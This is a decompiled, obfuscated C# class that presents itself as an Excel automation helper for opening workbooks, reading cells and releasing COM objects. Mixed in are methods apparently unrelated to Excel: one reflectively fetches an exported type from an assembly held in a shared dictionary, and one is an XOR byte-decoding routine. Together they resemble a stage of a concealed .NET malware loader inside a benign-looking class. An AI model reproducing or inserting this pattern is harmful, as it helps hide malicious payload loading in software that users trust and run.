using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Em6;
using Microsoft.VisualBasic.CompilerServices;
using Qd07;
using a3CY;
using a7BZ;
using s4K8;

namespace Fm3;

public class c2F
{
	private Nk8d _oXls;

	private p6G1 _oWBook;

	private Fd24 _oSheet;

	public Nk8d OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public p6G1 OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Fd24 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public c2F()
	{
		_oXls = (Nk8d)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Cz1(string a0G, bool Tm7)
	{
		OWBook = OXls.Workbooks.Open(a0G, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Tm7;
	}

	internal static bool Rt3()
	{
		try
		{
			try
			{
				Type type = (Type)x6E(RuntimeHelpers.GetObjectValue(Be0.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Be0.mDic[Be0.tName].ToString(), false) == 0)
				{
					Be0.mDic.Add(Be0.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Mm2(string f4D)
	{
		OSheet = (Fd24)OWBook.Sheets[f4D];
	}

	public c8SD Hp1(int Zq1, int e3Z)
	{
		return (c8SD)OSheet.Cells[Zq1, e3Z];
	}

	public void Fg8(bool d1W)
	{
		if (OWBook != null)
		{
			OWBook.Close(d1W, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Nk8d Yk = OXls;
		Ap3(ref Yk);
		OXls = Yk;
	}

	internal static byte Yt7(byte Ao9, byte[] Em5, int Me5, int Bq5)
	{
		Ao9 = (byte)(Ao9 ^ checked((byte)(Em5[unchecked(Bq5 % Em5.Length)] ^ ((Bq5 + unchecked(Me5 % Em5.Length)) & Me5))));
		return Ao9;
	}

	private static void Ap3<x2L>(ref x2L Yk1, bool e9Z = false) where x2L : class
	{
		if (Yk1 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Yk1))
			{
				if (e9Z)
				{
					Marshal.FinalReleaseComObject(Yk1);
				}
				else
				{
					Marshal.ReleaseComObject(Yk1);
				}
			}
		}
		finally
		{
			Yk1 = null;
		}
	}

	internal static object x6E(object Yy8)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Yy8, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
